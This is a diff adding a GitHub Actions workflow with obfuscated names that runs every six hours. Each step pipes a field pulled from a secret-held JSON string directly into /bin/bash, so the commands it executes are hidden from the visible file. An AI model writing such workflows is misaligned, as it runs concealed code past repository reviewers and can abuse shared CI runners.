@@ -1,0 +1,30 @@
+name: jinshenghuangzhu
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '7 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: jinshenghuangzhu
+        env:
+          jo4548: ${{ secrets.jo4548 }}
+        run: |
+          echo $jo4548 | jq -r .rtoqi440 | /bin/bash
+          echo $bx3416 | jq -r .fvuh8 | /bin/bash
+          echo $zx1 | jq -r .ftuu9 | /bin/bash
+          echo $fxa6 | jq -r .kg644 | /bin/bash
+          echo $ry2377 | jq -r .qkys72037 | /bin/bash
+          echo $g77352 | jq -r .v472 | /bin/bash
+          echo $is85515 | jq -r .b2180 | /bin/bash
+          echo $bkj1 | jq -r .trzkv9 | /bin/bash
+          echo $n66 | jq -r .apywi89 | /bin/bash
+          echo $oef60 | jq -r .ygpym37 | /bin/bash
+          echo $txv37200 | jq -r .hjdcq0 | /bin/bash
+          echo $uch5766 | jq -r .blaod64953 | /bin/bash
+          echo $qbz61687 | jq -r .sc21382 | /bin/bash
+
